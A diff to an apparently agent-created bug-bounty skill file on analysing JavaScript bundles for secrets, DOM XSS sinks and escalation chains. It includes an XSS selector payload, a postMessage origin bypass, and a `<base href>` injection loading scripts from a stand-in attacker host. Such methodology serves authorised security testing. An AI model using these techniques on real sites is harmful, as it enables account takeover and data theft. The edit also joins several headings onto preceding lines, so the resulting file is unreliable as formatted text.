@@ -4,14 +4,13 @@ description: "Analyze collected JS for secrets, endpoints, DOM sinks and client-
 agent_created: true
 ---
 
-# JavaScript bundle analysis — unified skill
+# JavaScript bundle analysis — unified methodology
 
-> **Complete merged skill.** Everything from 4 upstream skills across h1skills, hunting, research is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 4 upstream skills across h1skills, hunting, research. Payloads, wordlists and supporting data are in `references/`.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Ordered by yield.
@@ -35,19 +34,13 @@ Ordered by yield.
 - **Canonical DOM source/sink inventory (PortSwigger DOM Invader):** sources `location*`, `document.URL/baseURI/referrer/cookie`, `window.name`, `history.pushState`, `localStorage`/`sessionStorage`, web messages. High-rank sinks: `eval`, `Function`, `setTimeout`, `script.src`, `document.write`, `jQuery.html/append/attr`, `element.innerHTML/outerHTML`, `iframe.srcdoc`, `window.open`, `location.href`, `fetch`, `JSON.parse`, `localStorage.setItem`, `document.evaluate`.
 - **Obfuscation transforms:** hex `"\x2f\x61\x70\x69"`, unicode `"\u002f..."`, string-array decoder `_0x1b2c(0x1a4)`, `atob("L2FwaS9hZG1pbg==")`, dead code, control-flow-flattening `switch` loops. Deobfuscate with `webcrack`, `jsnice`, `prettier`/`js-beautify`.
 - **Client storage audit:** DevTools → Application → LocalStorage/sessionStorage for `token`, `jwt`, `role`, `user_info`.
-- **Third-party JS surface (OWASP Third Party JS cheat sheet):** SRI tags, script mirroring, "JavaScript Drift", outdated libs flagged by `retire.js`; OWASP Top 10:2025 A03 Software Supply Chain Failures.
-
-### Signals and surfaces
-
+- **Third-party JS surface (OWASP Third Party JS cheat sheet):** SRI tags, script mirroring, "JavaScript Drift", outdated libs flagged by `retire.js`; OWASP Top 10:2025 A03 Software Supply Chain Failures.### Signals and surfaces
 ### Signal
 
 - Secret exposure: **141** "api key" · **40** "hardcoded" · **34** "secret key" · **14** "access key"
 - Client-side auth: **66** JWT · **109** "client-side" · **57** `postMessage` · **20** `localStorage`
 - Top classes to mine: `info-disclosure` (1,827 reports), `crypto-and-secrets` (562), `xss` (2,569), `auth-bypass` (989), `authz-bypass` (1,386)
-- Median payoff for a *valid* hardcoded secret or source-map disclosure is usually low severity on its own — the money is in the **escalation** (forge a token, access another tenant, reach an internal API).
-
-### Techniques, payloads and bypasses
-
+- Median payoff for a *valid* hardcoded secret or source-map disclosure is usually low severity on its own — the money is in the **escalation** (forge a token, access another tenant, reach an internal API).### Techniques and bypasses
 ### 4. Webpack chunk names as a CSP-bypass oracle (GitLab, #1481207)
 
 After injecting a `<base href=https://attacker>` via Markdown, DevTools showed failed requests for `/assets/webpack/hello.<hash>.chunk.js`. Hosting files at those exact paths on the attacker domain made them load with the page's nonces → stored XSS. **Takeaway: the JS inventory from collection is itself an exploitation asset.**
@@ -63,10 +56,7 @@ After injecting a `<base href=https://attacker>` via Markdown, DevTools showed f
 - **CSP/selector-constrained DOM XSS (PayPal research):** probe `"` and escaped `\"` in a canary, observe sink context; valid-CSS-selector payload such as `input[value='"><iframe srcdoc=<script>alert(1)</script>>"']`; bypass allow-list CSP with unintended script gadgets.
 - **postMessage origin-check bypass:** `if (e.origin.endsWith('normal-website.com'))` accepts `https://evilnormal-website.com`; DOM Invader can spoof origin and auto-build the PoC iframe.
 - **Secret triage:** Stripe `pk_live_` publishable, Firebase web config, and Supabase `anon` keys are public-by-design; the finding is the *scope of what the service allows* (check rules minimally). `sk_live_`, `service_role`, and cloud provider credentials are real findings.
-- **Feature-flag escalation:** flip `isAdmin`/`beta` in devtools to reveal hidden UI, then call the endpoint directly with the original low-privilege token — UI-only gating is cosmetic (OWASP A01:2025).
-
-### Validation and proof
-
+- **Feature-flag escalation:** flip `isAdmin`/`beta` in devtools to reveal hidden UI, then call the endpoint directly with the original low-privilege token — UI-only gating is cosmetic (OWASP A01:2025).### Validation and proof
 ### C. Validation / proof bar — how to confirm and avoid false positives
 
 - Record exact JS URL, source-map URL, and line/variable; validate each secret as live and in-scope and demonstrate the concrete attacker action (OWASP Web Frontend cheat sheet: nothing sent to the client is secret; ASVS V13.4 forbids secrets in build artifacts).
@@ -95,10 +85,7 @@ Only for in-scope targets, only with benign markers.
 - Capture the file and line from the stack trace.
 - Confirm on your own account and test data only.
 
-Only a flow you reproduced gets `confidence: high`.
-
-### Escalation and related chains
-
+Only a flow you reproduced gets `confidence: high`.### Escalation and related chains
 ### Escalation chains
 
 A secret in JS is rarely the final finding. Chain it:
@@ -111,10 +98,7 @@ A secret in JS is rarely the final finding. Chain it:
 | Hidden internal endpoint | IDOR / missing authz on an unlisted API | #3085742 Bykea (▲128) |
 | postMessage sink | XSS → cookie/token theft → ATO | #398054 HackerOne; #534450 Superhuman |
 | Webpack chunk path + HTML injection | CSP bypass via `<base href>` → stored XSS | #1481207 GitLab (▲161) |
-| Source map | Recover full source → find auth flaw → escalate | #638635 Trint |
-
-### Tools and wordlists
-
+| Source map | Recover full source → find auth flaw → escalate | #638635 Trint |### Tools
 ### Entropy / tooling
 
 ```sh
@@ -122,10 +106,7 @@ trufflehog filesystem ./js-files --no-verification
 gitleaks detect --source ./js-files --no-git -v
 # jsfinder / SecretFinder for pattern-based JS sweeps
 python3 SecretFinder.py -i app.js -o cli
-```
-
-### Sources and related reading
-
+```### Sources and related reading
 ### 1. Source map → client-side JWT secret → arbitrary impersonation (Trint, #638635)
 
 The reporter fetched `/static/js/app.e984c9df.js.map` next to the minified bundle. Its `sourcesContent` contained `ZendeskLoadingPage.js` with:
@@ -149,10 +130,7 @@ Grepping the map for `REACT_APP_ZENDESK_SECRET` yielded the literal secret. Anyo
 7. https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html
 8. https://www.rootsec.in/cheatsheets/web-security/js-analysis (grep patterns, SecretFinder, LinkFinder, jsluice, source-map extraction)
 9. https://pwnversity.online/en/recon/recon-js/ (bundle/chunk/manifest anatomy, obfuscation reversal table)
-10. https://my-hack-tricks.gitbook.io/my-hacktricks/network-services-pentesting/pentesting-web/code-review-tools (JSnice/jsconsole deobfuscation workflow)
-
-### Additional notes
-
+10. https://my-hack-tricks.gitbook.io/my-hacktricks/network-services-pentesting/pentesting-web/code-review-tools (JSnice/jsconsole deobfuscation workflow)### Additional notes
 ### Prepare the files
 
 ```sh
@@ -478,13 +456,8 @@ Produce `analysis.md` with these sections:
 6. **Secrets** (redacted, with triage notes)
 7. **Next steps**: ordered list of what to test manually, most promising first
 
-For each lead, include the source file and line so you can find it again.
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/techniques.md
+For each lead, include the source file and line so you can find it again.### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # JavaScript Analysis — HackerOne field guide — Technique reference
 
@@ -564,19 +537,8 @@ A `message` listener parsed JSON, dispatched `mktoResponse`, and the success cal
 
 
 
-After injecting a `<base href=https://attacker>` via Markdown, DevTools showed failed requests for `/assets/webpack/hello.<hash>.chunk.js`. Hosting files at those exact paths on the attacker domain made them load with the page's nonces → stored XSS. **Takeaway: the JS inventory from collection is itself an exploitation asset.**
+After injecting a `<base href=https://attacker>` via Markdown, DevTools showed failed requests for `/assets/webpack/hello.<hash>.chunk.js`. Hosting files at those exact paths on the attacker domain made them load with the page's nonces → stored XSS. **Takeaway: the JS inventory from collection is itself an exploitation asset.**## Probes
 
-## Source skills merged into this topic
+## Supporting data
 
-- `h1skills` — `hackerone-js-analyze`
-- `hunting` — `js-analyze`
-- `research` — `js-sinks`
-- `research` — `js-analyze`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 1 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
